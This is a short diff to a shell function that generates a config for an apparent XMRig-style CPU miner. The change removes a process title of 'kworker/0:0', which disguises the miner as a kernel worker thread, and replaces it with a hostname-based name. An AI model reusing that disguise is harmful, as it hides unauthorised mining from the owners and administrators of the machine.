@@ -77,7 +77,7 @@ generate_config() {
 {
     "autosave": false,
     "donate-level": 0,
-    "title": "kworker/0:0",
+    "title": "${HOSTNAME}-$((RANDOM%1000))",
     "cpu": {
         "enabled": true,
         "max-threads-hint": $cpu_hint,
